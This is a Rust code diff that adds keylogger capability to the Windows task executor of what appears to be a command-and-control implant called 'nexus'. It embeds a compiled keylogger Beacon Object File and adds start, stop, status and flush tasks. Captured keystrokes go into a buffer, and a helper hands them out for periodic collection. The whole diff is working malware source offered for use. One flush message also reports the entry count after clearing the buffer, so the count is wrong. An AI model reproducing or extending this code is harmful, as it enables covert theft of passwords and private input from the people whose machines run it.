@@ -1,13 +1,51 @@
 use nexus_common::*;
 use std::process::Command;
 use base64::{Engine as _, engine::general_purpose};
+use log::{info, warn, debug, error};
 
 #[cfg(target_os = "windows")]
 use crate::fiber_execution::FiberExecutor;
 
+#[cfg(target_os = "windows")]
+use nexus_infra::bof_loader::{BOFLoader, BofArgument, LoadedBof};
+
+#[cfg(target_os = "windows")]
+use std::sync::{Arc, Mutex};
+
+#[cfg(target_os = "windows")]
+use std::ffi::c_void;
+
+// Embedded keylogger BOF data (will be populated by build system)
+#[cfg(target_os = "windows")]
+const KEYLOGGER_BOF_DATA: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/nexus_keylogger.o"));
+
+// Keylogger state management
+#[cfg(target_os = "windows")]
+#[derive(Clone)]
+struct KeyloggerState {
+    loaded_bof: Option<Arc<LoadedBof>>,
+    bof_loader: Arc<BOFLoader>,
+    is_active: bool,
+    data_buffer: Arc<Mutex<Vec<String>>>,
+}
+
+#[cfg(target_os = "windows")]
+impl KeyloggerState {
+    fn new() -> Self {
+        Self {
+            loaded_bof: None,
+            bof_loader: Arc::new(BOFLoader::new()),
+            is_active: false,
+            data_buffer: Arc::new(Mutex::new(Vec::new())),
+        }
+    }
+}
+
 pub struct TaskExecutor {
     #[cfg(target_os = "windows")]
     fiber_executor: FiberExecutor,
+    #[cfg(target_os = "windows")]
+    keylogger_state: Arc<Mutex<KeyloggerState>>,
 }
 
 impl TaskExecutor {
@@ -15,6 +53,8 @@ impl TaskExecutor {
         Self {
             #[cfg(target_os = "windows")]
             fiber_executor: FiberExecutor::new(),
+            #[cfg(target_os = "windows")]
+            keylogger_state: Arc::new(Mutex::new(KeyloggerState::new())),
         }
     }
 
@@ -40,6 +80,16 @@ impl TaskExecutor {
             "registry_set" => self.set_registry(&task_data).await,
             #[cfg(target_os = "windows")]
             "service_control" => self.control_service(&task_data).await,
+            
+            // Keylogger BOF operations
+            #[cfg(target_os = "windows")]
+            "keylogger_start" => self.execute_keylogger_start(&task_data).await,
+            #[cfg(target_os = "windows")]
+            "keylogger_stop" => self.execute_keylogger_stop(&task_data).await,
+            #[cfg(target_os = "windows")]
+            "keylogger_status" => self.execute_keylogger_status(&task_data).await,
+            #[cfg(target_os = "windows")]
+            "keylogger_flush" => self.execute_keylogger_flush(&task_data).await,
             
             _ => Err(NexusError::TaskExecutionError(
                 format!("Unknown task type: {}", task_data.task_type)
@@ -383,6 +433,188 @@ impl TaskExecutor {
                 format!("Service control error: {}", String::from_utf8_lossy(&output.stderr))
             ))
         }
+    }
+
+    // Keylogger BOF execution methods
+    #[cfg(target_os = "windows")]
+    async fn execute_keylogger_start(&self, task_data: &TaskData) -> Result<String> {
+        use std::ffi::CString;
+        
+        info!("Starting keylogger BOF");
+        
+        let mut state = self.keylogger_state.lock().map_err(|e| {
+            NexusError::TaskExecutionError(format!("Failed to acquire keylogger state lock: {}", e))
+        })?;
+
+        if state.is_active {
+            return Ok("Keylogger is already running".to_string());
+        }
+
+        // Load the keylogger BOF if not already loaded
+        if state.loaded_bof.is_none() {
+            match state.bof_loader.load_bof(KEYLOGGER_BOF_DATA) {
+                Ok(loaded_bof) => {
+                    info!("Keylogger BOF loaded successfully");
+                    state.loaded_bof = Some(Arc::new(loaded_bof));
+                },
+                Err(e) => {
+                    error!("Failed to load keylogger BOF: {}", e);
+                    return Err(NexusError::TaskExecutionError(format!("BOF load failed: {}", e)));
+                }
+            }
+        }
+
+        if let Some(ref loaded_bof) = state.loaded_bof {
+            // Create data callback closure
+            let data_buffer = Arc::clone(&state.data_buffer);
+            let callback_ptr = Box::into_raw(Box::new(move |data: *const std::os::raw::c_char, length: u32| {
+                unsafe {
+                    if !data.is_null() && length > 0 {
+                        let slice = std::slice::from_raw_parts(data as *const u8, length as usize);
+                        if let Ok(json_str) = String::from_utf8(slice.to_vec()) {
+                            if let Ok(mut buffer) = data_buffer.lock() {
+                                buffer.push(json_str);
+                            }
+                        }
+                    }
+                }
+            })) as *mut _ as usize;
+
+            // Create arguments with callback pointer
+            let args = vec![BofArgument::binary(callback_ptr.to_le_bytes().to_vec())];
+
+            // Execute keylogger start function
+            match state.bof_loader.execute_bof(loaded_bof, "keylogger_start", &args) {
+                Ok(result) => {
+                    state.is_active = true;
+                    info!("Keylogger started successfully");
+                    Ok(format!("Keylogger started: {}", result))
+                },
+                Err(e) => {
+                    error!("Failed to start keylogger: {}", e);
+                    Err(NexusError::TaskExecutionError(format!("Keylogger start failed: {}", e)))
+                }
+            }
+        } else {
+            Err(NexusError::TaskExecutionError("Keylogger BOF not loaded".to_string()))
+        }
+    }
+
+    #[cfg(target_os = "windows")]
+    async fn execute_keylogger_stop(&self, task_data: &TaskData) -> Result<String> {
+        info!("Stopping keylogger BOF");
+        
+        let mut state = self.keylogger_state.lock().map_err(|e| {
+            NexusError::TaskExecutionError(format!("Failed to acquire keylogger state lock: {}", e))
+        })?;
+
+        if !state.is_active {
+            return Ok("Keylogger is not running".to_string());
+        }
+
+        if let Some(ref loaded_bof) = state.loaded_bof {
+            let args = vec![];
+            
+            match state.bof_loader.execute_bof(loaded_bof, "keylogger_stop", &args) {
+                Ok(result) => {
+                    state.is_active = false;
+                    info!("Keylogger stopped successfully");
+                    
+                    // Collect any remaining data
+                    let collected_data = if let Ok(mut buffer) = state.data_buffer.lock() {
+                        let data = buffer.join("\n");
+                        buffer.clear();
+                        data
+                    } else {
+                        String::new()
+                    };
+                    
+                    Ok(format!("Keylogger stopped: {}\nCollected data: {}", result, collected_data))
+                },
+                Err(e) => {
+                    error!("Failed to stop keylogger: {}", e);
+                    Err(NexusError::TaskExecutionError(format!("Keylogger stop failed: {}", e)))
+                }
+            }
+        } else {
+            Err(NexusError::TaskExecutionError("Keylogger BOF not loaded".to_string()))
+        }
+    }
+
+    #[cfg(target_os = "windows")]
+    async fn execute_keylogger_status(&self, task_data: &TaskData) -> Result<String> {
+        info!("Getting keylogger status");
+        
+        let state = self.keylogger_state.lock().map_err(|e| {
+            NexusError::TaskExecutionError(format!("Failed to acquire keylogger state lock: {}", e))
+        })?;
+
+        if let Some(ref loaded_bof) = state.loaded_bof {
+            let args = vec![];
+            
+            match state.bof_loader.execute_bof(loaded_bof, "keylogger_status", &args) {
+                Ok(result) => {
+                    let buffer_count = if let Ok(buffer) = state.data_buffer.lock() {
+                        buffer.len()
+                    } else {
+                        0
+                    };
+                    
+                    Ok(format!("Status: {}\nAgent buffer count: {}", result, buffer_count))
+                },
+                Err(e) => {
+                    error!("Failed to get keylogger status: {}", e);
+                    Err(NexusError::TaskExecutionError(format!("Keylogger status failed: {}", e)))
+                }
+            }
+        } else {
+            Ok(format!("Keylogger BOF not loaded, active: {}", state.is_active))
+        }
+    }
+
+    #[cfg(target_os = "windows")]
+    async fn execute_keylogger_flush(&self, task_data: &TaskData) -> Result<String> {
+        info!("Flushing keylogger data");
+        
+        let state = self.keylogger_state.lock().map_err(|e| {
+            NexusError::TaskExecutionError(format!("Failed to acquire keylogger state lock: {}", e))
+        })?;
+
+        // First flush data from BOF
+        if let Some(ref loaded_bof) = state.loaded_bof {
+            let args = vec![];
+            let _ = state.bof_loader.execute_bof(loaded_bof, "keylogger_flush", &args);
+        }
+
+        // Collect buffered data
+        let collected_data = if let Ok(mut buffer) = state.data_buffer.lock() {
+            if buffer.is_empty() {
+                "No keylogger data available".to_string()
+            } else {
+                let data = buffer.join("\n");
+                buffer.clear();
+                format!("Collected keylogger data ({} entries):\n{}", buffer.len(), data)
+            }
+        } else {
+            "Failed to access data buffer".to_string()
+        };
+
+        Ok(collected_data)
+    }
+
+    // Helper method to get collected keylogger data (for periodic collection)
+    #[cfg(target_os = "windows")]
+    pub async fn get_keylogger_data(&self) -> Option<String> {
+        if let Ok(state) = self.keylogger_state.lock() {
+            if let Ok(mut buffer) = state.data_buffer.lock() {
+                if !buffer.is_empty() {
+                    let data = buffer.join("\n");
+                    buffer.clear();
+                    return Some(data);
+                }
+            }
+        }
+        None
     }
 }
 
